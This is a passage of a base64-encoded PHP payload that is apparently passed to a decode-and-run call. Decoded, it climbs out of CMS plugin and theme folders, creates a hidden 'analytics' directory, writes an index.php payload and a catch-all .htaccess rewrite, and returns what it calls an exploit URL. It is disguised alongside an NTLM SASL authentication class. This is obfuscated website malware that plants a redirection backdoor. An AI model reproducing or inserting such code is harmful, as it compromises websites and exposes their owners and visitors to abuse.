iA9IHBhcmVudGRpcigkdXJsKTsNCiAgICAkRmlsZW5hbWUgICAgICAgPSAiaW5kZXgucGhwIjsNCiAgICAkRm9sZGVyICAgICAgICAgPSAiIjsNCiAgICBpZiAoJFJlZGlyZWN0aW9uRGlyICE9ICRDdXJyZW50VVJMKSB7DQogICAgICAgICRGb2xkZXIgPSAiLi4vIjsNCiAgICAgICAgd2hpbGUgKHRydWUpIHsNCiAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCcvKD86d3AtY29udGVudFwvcGx1Z2luc3x3cC1jb250ZW50XC90aGVtZXN8d3AtaW5jbHVkZXN8d3AtYWRtaW58d3AtY29udGVudHxtb2R1bGVzXC9tb2Rfd2RiYW5uZXJzfGluY2x1ZGVzXC98Z29vZ2xlX3JlY29tbWVuZHN8bXQtc3RhdGljfGRhdGFcL21vZHVsZSkvJywgcGFyc2VfdXJsKCRSZWRpcmVjdGlvbkRpciwgUEhQX1VSTF9QQVRIKSkpIHsNCiAgICAgICAgICAgICAgICAkRm9sZGVyIC49ICIuLi8iOw0KICAgICAgICAgICAgICAgICRSZWRpcmVjdGlvbkRpciA9IHBhcmVudGRpcigkUmVkaXJlY3Rpb25EaXIpOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICBpZiAoIWZpbGVfZXhpc3RzKCRGb2xkZXIgLiAiYW5hbHl0aWNzIiAuIFJFRElSRUNUSU9OX0ZPTERFUiAuICIvIiAuICRGaWxlbmFtZSkpIHsNCiAgICAgICAgaWYgKCFpc19kaXIoJEZvbGRlciAuICJhbmFseXRpY3MiIC4gUkVESVJFQ1RJT05fRk9MREVSKSkgew0KICAgICAgICAgICAgQG1rZGlyKCRGb2xkZXIgLiAiYW5hbHl0aWNzIiAuIFJFRElSRUNUSU9OX0ZPTERFUik7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGlzX2RpcigkRm9sZGVyIC4gImFuYWx5dGljcyIgLiBSRURJUkVDVElPTl9GT0xERVIpKSB7DQogICAgICAgICAgICBAZmlsZV9wdXRfY29udGVudHMoJEZvbGRlciAuICJhbmFseXRpY3MiIC4gUkVESVJFQ1RJT05fRk9MREVSIC4gIi8iIC4gJEZpbGVuYW1lLCBSZWRpcmVjdGlvbkZpbGUoKSk7DQogICAgICAgICAgICAkQ29udGVudCAgID0gYXJyYXkoKTsNCiAgICAgICAgICAgICRDb250ZW50W10gPSAnPElmTW9kdWxlIG1vZF9yZXdyaXRlLmM+JzsNCiAgICAgICAgICAgICRDb250ZW50W10gPSAnCTxJZk1vZHVsZSBtb2RfZW52LmM+JzsNCiAgICAgICAgICAgICRDb250ZW50W10gPSAnCQlTZXRFbnYgSFRUUF9NT0RfUkVXUklURV9TSEVMTCBPbic7DQogICAgICAgICAgICAkQ29udGVudFtdID0gJwk8L0lmTW9kdWxlPic7DQogICAgICAgICAgICAkQ29udGVudFtdID0gJ1Jld3JpdGVFbmdpbmUgT24nOw0KICAgICAgICAgICAgJENvbnRlbnRbXSA9ICdSZXdyaXRlQ29uZCAle1JFUVVFU1RfRklMRU5BTUV9ICEtZic7DQogICAgICAgICAgICAkQ29udGVudFtdID0gJ1Jld3JpdGVDb25kICV7UkVRVUVTVF9GSUxFTkFNRX0gIS1sJzsNCiAgICAgICAgICAgICRDb250ZW50W10gPSAnUmV3cml0ZUNvbmQgJXtSRVFVRVNUX1VSSX0gIS1sJzsNCiAgICAgICAgICAgICRDb250ZW50W10gPSAnUmV3cml0ZUNvbmQgJXtSRVFVRVNUX0ZJTEVOQU1FfSAhXC4oaWNvfGNzc3xwbmd8anBnfGdpZnxqcykkIFtOQ10nOw0KICAgICAgICAgICAgJENvbnRlbnRbXSA9ICdSZXdyaXRlUnVsZSAuIGluZGV4LnBocCc7DQogICAgICAgICAgICAkQ29udGVudFtdID0gJzwvSWZNb2R1bGU+JzsNCiAgICAgICAgICAgIEBmaWxlX3B1dF9jb250ZW50cygkRm9sZGVyIC4gImFuYWx5dGljcyIgLiBSRURJUkVDVElPTl9GT0xERVIgLiAiLy5odGFjY2VzcyIsIGltcGxvZGUoUEhQX0VPTCwgJENvbnRlbnQpKTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBpZiAoIWZpbGVfZXhpc3RzKCRGb2xkZXIgLiAiYW5hbHl0aWNzIiAuIFJFRElSRUNUSU9OX0ZPTERFUiAuICIvIiAuICRGaWxlbmFtZSkpIHsNCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCiAgICBpZiAoIWlzUmV3cml0ZU9OKCkpIHsNCiAgICAgICAgJGV4cGxvaXRVUkwgPSAkUmVkaXJlY3Rpb25EaXIgLiAiYW5hbHl0aWNzIiAuIFJFRElSRUNUSU9OX0ZPTERFUiAuICIvP3Jld3JpdGU9IjsNCiAgICB9IGVsc2Ugew0KICAgICAgICAkZXhwbG9pdFVSTCA9ICRSZWRpcmVjdGlvbkRpciAuICJhbmFseXRpY3MiIC4gUkVESVJFQ1RJT05fRk9MREVSIC4gIi8iOw0KICAgIH0NCiAgICByZXR1cm4gJGV4cGxvaXRVUkw7DQp9DQpkZWZpbmUoIlNBU0xfTlRMTV9TVEFURV9TVEFSVCIsIDApOw0KZGVmaW5lKCJTQVNMX05UTE1fU1RBVEVfSURFTlRJRllfRE9NQUlOIiwgMSk7DQpkZWZpbmUoIlNBU0xfTlRMTV9TVEFURV9SRVNQT05EX0NIQUxMRU5HRSIsIDIpOw0KZGVmaW5lKCJTQVNMX05UTE1fU1RBVEVfRE9ORSIsIDMpOw0KZGVmaW5lKCJTQVNMX0ZBSUwiLCAtMSk7DQpkZWZpbmUoIlNBU0xfQ09OVElOVUUiLCAxKTsNCg0KY2xhc3MgbnRsbV9zYXNsX2NsaWVudF9jbGFzcw0Kew0KICAgIHB1YmxpYyAkY3JlZGVudGlhbHMgPSBhcnJheSgpOw0KICAgIHB1YmxpYyAkc3RhdGUgPSBTQVNMX05UTE1fU1RBVEVfU1RBUlQ7DQoNCiAgICBwdWJsaWMgZnVuY3Rpb24gaW5pdGlhbGl6ZSgmJGNsaWVudCkNCiAgICB7DQogICAgICAgIGlmICghZnVuY3Rpb25fZXhpc3RzKCRmdW5jdGlvbiA9ICJtY3J5cHRfZW5jcnlwdCIpDQogICAgICAgICAgICB8fCAhZnVuY3Rpb25fZXhpc3RzKCRmdW5jdGlvbiA9ICJtaGFzaCIpDQogICAgICAgICkgew0KICAgICAgICAgICAgJGV4dGVuc2lvbnMgPSBhcnJheSgNCiAgICAgICAgICAgICAgICAibWNyeXB0X2VuY3J5cHQiID0+ICJtY3J5cHQiLA0KICAgICAgICAgICAgICAgICJtaGFzaCIgPT4gIm1oYXNoIg0KICAgICAgICAgICAgKTsNCiAgICAgICAgICAgICRjbGllbnQtPmVycm9yID0gInRoZSBleHRlbnNpb24gIiAuICRleHRlbnNpb25zWyRmdW5jdGlvbl0gLg0KICAgICAgICAgICAgICAgICIgcmVxdWlyZWQgYnkgdGhlIE5UTE0gU0FTTCBjbGllbnQgY2xhc3MgaXMgbm90IGF2YWlsYWJsZSBpbiB0aGlzIFBIUCBjb25maWd1cmF0aW9uIjsNCiAgICAgICAgICAgIHJldHVybiAoMCk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICgxKTsNCiAgICB9DQoNCiAgICBwdWJsaWMgZnVuY3Rpb24gQVNDSUlUb1VuaWNvZGUoJGFzY2lpKQ0KICAgIHsNCiAgICAgICAgZm9yICgkdW5pY29kZSA9ICIiLCAkYSA9IDA7ICRhIDwgc3RybGVuKCRhc2NpaSk7ICRhKyspIHsNCiAgICAgICAgICAgICR1bmljb2RlIC49IHN1YnN0cigkYXNjaWksICRhLCAxKSAuIGNocigwKTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gKCR1bmljb2RlKTsNCiAgICB9DQoNCiAgICBwdWJsaWMgZnVuY3Rpb24gdHlwZU1zZzEoJGRvbWFpbiwgJHdvcmtzdGF0aW9uKQ0KICAgIHsNCiAgICAgICAgJGRvbWFpbl9sZW5ndGggPSBzdHJsZW4oJGRvbWFpbik7DQogICAgICAgICR3b3Jrc3RhdGlvbl9sZW5ndGggPSBzdHJsZW4oJHdvcmtzdGF0aW9uKTsNCiAgICAgICAgJHdvcmtzdGF0aW9uX29mZnNldCA9IDMyOw0KICAgICAgICAkZG9tYWluX29mZnNldCA9ICR3b3Jrc3RhdGlvbl9vZmZzZXQgKyAkd29ya3N0YXRpb25fbGVuZ3RoOw0KICAgICAgICByZXR1cm4gKA0KICAgICAgICAgICAgIk5UTE1TU1BcMCIgLg0KICAgICAgICAgICAgIlx4MDFceDAwXHgwMFx4MDAiIC4NCiAgICAgICAgICAgICJceDA3XHgzMlx4MDBceDAwIiAuDQogICAgICAgICAgICBwYWNrKCJ2IiwgJGRvbWFpbl9sZW5ndGgpIC4NCiAgICAgICAgICAgIHBhY2soInYiLCAkZG9tYWluX2xlbmd0aCkgLg0KICAgICAgICAgICAgcGFjaygiViIsICRkb21haW5fb2Zmc2V0KSAuDQogICAgICAgICAgICBwYWNrKCJ2IiwgJHdvcmtzdGF0aW9uX2xlbmd0aCkgLg0KICAgICAgICAgICAgcGFjaygidiIsICR3b3Jrc3RhdGlvbl9sZW5ndGgpIC4NCiAgICAgICAgICAgIHBhY2soIlYiLCAkd29ya3N0YXRpb25fb2Zmc2V0KSAuDQogICAgICAgICAgICAkd29ya3N0YXRpb24gLg0KICAgICAgICAgICAgJGRvbWFpbg0KICAgICAgICApOw0KICAgIH0NCg0KICAgIHB1YmxpYyBmdW5jdGlvbiBOVExNUmVzcG9uc2UoJGNoYWxsZW5nZSwgJHBhc3N3b3JkKQ0KICAgIHsNCiAgICAgICAgJHVuaWNvZGUgPSAkdGhpcy0+QVNDSUlUb1VuaWNvZGUoJHBhc3N3b3JkKTsNCiAgICAgICAgJG1kNCA9IG1oYXNoKE1IQVNIX01ENCwgJHVuaWNvZGUpOw0KICAgICAgICAkcGFkZGVkID0gJG1kNCAuIHN0cl9yZXBlYXQoY2hyKDApLCAyMSAtIHN0cmxlbigkbWQ0KSk7DQogICAgICAgICRpdl9zaXplID0gbWNyeXB0X2dldF9pdl9zaXplKE1DUllQVF9ERVMsIE1DUllQVF9NT0RFX0VDQik7DQogICAgICAgICRpdiA9IG1jcnlwdF9jcmVhdGVfaXYoJGl2X3NpemUsIE1DUllQVF9SQU5EKTsNCiAgICAgICAgZm9yICgkcmVzcG9uc2UgPSAiIiwgJHRoaXJkID0gMDsgJHRoaXJkIDwgMjE7ICR0aGlyZCArPSA3KSB7DQogICAgICAgICAgICBmb3IgKCRwYWNrZWQgPSAiIiwgJHAgPSAkdGhpcmQ7ICRwIDwgJHRoaXJkICsgNzsgJHArKykgew0KICAgICAgICAgICAgICAgICRwYWNrZWQgLj0gc3RyX3BhZChkZWNiaW4ob3JkKHN1YnN0cigkcGFkZGVkLCAkcCwgMSkpKSwgOCwgIjAiLCBTVFJfUEFEX0xFRlQpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZm9yICgka2V5ID0gIiIsICRwID0gMDsgJHAgPCBzdHJsZW4oJHBhY2tlZCk7ICRwICs9IDcpIHsNCiAgICAgICAgICAgICAgICAkcyA9IHN1YnN0cigkcGFja2VkLCAkcCwgNyk7DQogICAgICAgICAgICAgICAgJGIgPSAkcyAuICgoc3Vic3RyX2NvdW50KCRzLCAiMSIpICUgMikgPyAiMCIgOiAiMSIpOw0KICAgICAgICAgICAgICAgICRrZXkgLj0gY2hyKGJpbmRlYygkYikpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgJGNpcGhlcnRleHQgPSBtY3J5cHRfZW5jcnlwdChNQ1JZUFRfREVTLCAka2V5LCAkY2hhbGxlbmdlLCBNQ1JZUFRfTU9ERV9FQ0IsICRpdik7DQogICAgICAgICAgICAkcmVzcG9uc2UgLj0gJGNpcGhlcnRleHQ7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRyZXNwb25zZTsNCiAgICB9DQoNCiAgICBwdWJsaWMgZnVuY3Rpb24gdHlwZU1zZzMoJG50bG1fcmVzcG9uc2UsICR1c2VyLCAkZG9tYWluLCAkd29ya3N0YXRpb24pDQogICAgew0KICAgICAgICAkZG9tYWluX3VuaWNvZGUgPSAkdGhpcy0+QVNDSUlUb1VuaWNvZGUoJGRvbWFpbik7DQogICAgICAgICRkb21haW5fbGVuZ3RoID0gc3RybGVuKCRkb21haW5fdW5pY29kZSk7DQogICAgICAgICRkb21haW5fb2Zmc2V0ID0gNjQ7DQogICAgICAgICR1c2VyX3VuaWNvZGUgPSAkdGhpcy0+QVNDSUlUb1VuaWNvZGUoJHVzZXIpOw0KICAgICAgICAkdXNlcl9sZW5ndGggPSBzdHJsZW4oJHVzZXJfdW5pY29kZSk7DQogICAgICAgICR1c2VyX29mZnNldCA9ICRkb21haW5fb2Zmc2V0ICsgJGRvbWFpbl9sZW5ndGg7DQogICAgICAgICR3b3Jrc3RhdGlvbl91bmljb2RlID0gJHRoaXMtPkFTQ0lJVG9Vbmljb2RlKCR3b3Jrc3RhdGlvbik7DQogICAgICAgICR3b3Jrc3RhdGlvbl9sZW5ndGggPSBzdHJsZW4oJHdvcmtzdGF0aW9uX3VuaWNvZGUpOw0KICAgICAgICAkd29ya3N0YXRpb25fb2Zmc2V0ID0gJHVzZXJfb2Zmc2V0ICsgJHVzZXJfbGVuZ3RoOw0KICAgICAgICAkbG0gPSAiIjsNCiAgICAgICAgJGxtX2xlbmd0aCA9IHN0cmxlbigkbG0pOw0KICAgICAgICAkbG1fb2Zmc2V0ID0gJHdvcmtzdGF0aW9uX29mZnNldCArICR3b3Jrc3RhdGlvbl9sZW5ndGg7DQogICAgICAgICRudGxtID0gJG50bG1fcmVzcG9uc2U7DQogICAgICAgICRudGxtX2xlbmd0aCA9IHN0cmxlbigkbnRsbSk7DQogICAgICAgICRudGxtX29mZnNldCA9ICRsbV9vZmZzZXQgKyAkbG1fbGVuZ3RoOw0KICAgICAgICAkc2Vzc2lvbiA9ICIiOw0KICAgICAgICAkc2Vzc2lvbl9sZW5ndGggPSBzdHJsZW4oJHNlc3Npb24pOw0KICAgICAgICAkc2Vzc2lvbl9vZmZzZXQgPSAkbnRsbV9vZmZzZXQgKyAkbnRsbV9sZW5ndGg7DQogICAgICAgIHJldHVybiAoDQogICAgICAgICAgICAiTlRMTVNTUFwwIiAuDQogICAgICAgICAgICAiXHgwM1x4MDBceDAwXHgwMCIgLg0KICAgICAgICAgICAgcGFjaygidiIsICRsbV9sZW5ndGgpIC4NCiAgICAgICAgICAgIHBhY2soInYiLCAkbG1fbGVuZ3RoKSAuDQogICAgICAgICAgICBwYWNrKCJWIiwgJGxtX29mZnNldCkgLg0KICAgICAgICAgICAgcGFjaygidiIsICRudGxtX2xlbmd0aCkgLg0KICAgICAgICAgICAgcGFjaygidiIsICRudGxtX2xlbmd0aCkgLg0KICAgICAgICAgICAgcGFjaygiViIsICRudGxtX29mZnNldCkgLg0KICAgICAgICAgICAgcGFjaygidiIsICRkb21haW5fbGVuZ3RoKSAuDQogICAgICAgICAgICBwYWNrKCJ2IiwgJGRvbWFpbl9sZW5ndGgpIC4NCiAgICAgICAgICAgIHBhY2soIlYiLCAkZG9tYWluX29mZnNldCkgLg0KICAgICAgICAgICAgcGFjaygidiIsICR1c2VyX2xlbmd0aCkgLg0KICAgICAgICAgICAgcGFjaygidiIsICR1c2VyX2xlbmd0aCkgLg0KICAgICAgICAgICAgcGFjaygiViIsICR1c2VyX29mZnNldCkgLg0KICAgICAgICAgICAgcGFjaygidiIsICR3b3Jrc3RhdGlvbl9sZW5ndGgpIC4NCiAgICAgICAgICAgIHBhY2soInYiLCAkd29ya3N0YXRpb25fbGVuZ3RoKSAuDQogICAgICAgICAgICBwYWNrKCJWIiwgJHdvcmtzdGF0aW9uX29mZnNldCkgLg0KICAgICAgICAgICAgcGFjaygidiIsICRzZXNzaW9uX2xlbmd0aCkgLg0KICAgICAgICAgICAgcGFjaygidiIsICRzZXNzaW9uX2xlbmd0aCkgLg0KICAgICAgICAgICAgcGFjaygiViIsICRzZXNzaW9uX29mZnNldCkgLg0KICAgICAgICAgICAgIlx4MDFceDAyXHgwMFx4MDAiIC4NCiAgICAgICAgICAgICRkb21haW5fdW5pY29kZSAuDQogICAgICAgICAgICAkdXNlcl91bmljb2RlIC4NCiAgICAgICAgICAgICR3b3Jrc3RhdGlvbl91bmljb2RlIC4NCiAgICAgICAgICAgICRsbSAuDQogICAgICAgICAgICAkbnRsbQ0KICAgICAgICApOw0KICAgIH0NCg0KICAgIHB1YmxpYyBmdW5jdGlvbiBzdGFydCgmJGNsaWVudCwgJiRtZXNzYWdlLCAmJGludGVyYWN0aW9ucykNCiAgICB7DQogICAgICAgIGlmICgkdGhpcy0+c3RhdGUgIT0gU0FTTF9OVExNX1NUQVRFX1NUQVJUKSB7DQogICAgICAgICAgICAkY2xpZW50LT5lcnJvciA9ICJOVExNIGF1dGhlbnRpY2F0aW9uIHN0YXRlIGlzIG5vdCBhdCB0aGUgc3RhcnQiOw0KICAgICAgICAgICAgcmV0dXJuIChTQVNMX0ZBSUwpOw0KICAgICAgICB9DQogICAgICAgICR0aGlzLT5jcmVkZW50aWFscyA9IGFycmF5KA0KICAgICAgICAgICAgInVzZXIiID0+ICIiLA0KICAgICAgICAgICAgInBhc3N3b3JkIiA9PiAiIiwNCiAgICAgICAgICAgICJyZWFsbSIgPT4gIiIsDQogICAgICAgICAgICAid29ya3N0YXRpb24iID0+ICIiDQogICAgICAgICk7DQogICAgICAgICRkZWZhdWx0cyA9IGFycmF5KCk7DQogICAgICAgICRzdGF0dXMgPSAkY2xpZW50LT5HZXRDcmVkZW50aWFscygkdGhpcy0+Y3JlZGVudGlhbHMsICRkZWZhdWx0cywgJGludGVyYWN0aW9ucyk7DQogICAgICAgIGlmICgkc3RhdHVzID09IFNBU0xfQ09OVElOVUUpIHsNCiAgICAgICAgICAgICR0aGlzLT5zdGF0ZSA9IFNBU0xfTlRMTV9TVEFURV9JREVOVElGWV9ET01BSU47DQogICAgICAgIH0NCiAgICAgICAgdW5zZXQoJG1lc3NhZ2UpOw0KICAgICAgICByZXR1cm4gKCRzdGF0dXMpOw0KICAgIH0NCg0KICAgIHB1YmxpYyBmdW5jdGlvbiBzdGVwKCYkY2xpZW50LCAkcmVzcG9uc2UsICYkbWVzc2FnZSwgJiRpbnRlcmFjdGlvbnMpDQogICAgew0KICAgICAgICBzd2l0Y2ggKCR0aGlzLT5zdGF0ZSkgew0KICAgICAgICAgICAgY2FzZSBTQVNMX05UTE1fU1RBVEVfSURFTlRJRllfRE9NQUlOOg0KICAgICAgICAgICAgICAgICRtZXNzYWdlID0gJHRoaXMtPnR5cGVNc2cxKCR0aGlzLT5jcmVkZW50aWFsc1sicmVhbG0iXSwgJHRoaXMtPmNyZWRlbnRpYWxzWyJ3b3Jrc3RhdGlvbiJdKTsNCiAgICAgICAgICAgICAgICAkdGhpcy0+c3RhdGUgPSBTQVNMX05UTE1fU1RBVEVfUkVTUE9ORF9DSEFMTEVOR0U7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlIFNBU0xfTlRMTV9TVEFURV9SRVNQT05EX0NIQUxMRU5HRToNCiAgICAgICAgICAgICAgICAkbnRsbV9yZXNwb25zZSA9ICR0aGlzLT5OVExNUmVzcG9uc2Uoc3Vic3RyKCRyZXNwb25zZSwgMjQsIDgpLCAkdGhpcy0+Y3JlZGVudGlhbHNbInBhc3N3b3JkIl0pOw0KICAgICAgICAgICAgICAgICRtZXNzYWdlID0gJHRoaXMtPnR5cGVNc2czKA0KICAgICAgICAgICAgICAgICAgICAkbnRsbV9yZXNwb25zZSwNCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmNyZWRlbnRpYWxzWyJ1c2VyIl0sDQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5jcmVkZW50aWFsc1sicmVhbG0iXSwNCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmNyZWRlbnRpYWxzWyJ3b3Jrc3RhdGlvbiJdDQogICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgICAgICAkdGhpcy0+c3RhdGUgPSBTQVNMX05UTE1fU1RBVEVfRE9ORTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgU0FTTF9OVExNX1NUQVRFX0RPTkU6DQogICAgICAgICAgICAgICAgJGNsaWVudC0+ZXJyb3IgPSAiTlRMTSBhdXRoZW50aWNhdGlvbiB3YXMgZmluaXNoZWQgd2l0aG91dCBzdWNjZXNzIjsNCiAgICAgICAgICAgICAgICByZXR1cm4gKFNBU0xfRkFJTCk7DQogICAgICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgICAgICRjbGllbnQtPmVycm9yID0gImludmFsaWQgTlRMTSBhdXRoZW50aWNhdGlvbiBzdGVwIHN0YXRlIjsNCiAgICAgICAgICAgICAgICByZXR1cm4gKFNBU0xfRkFJTCk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIChTQVNMX0NPTlRJTlVFKTsNCiAgICB9DQp9DQo="));
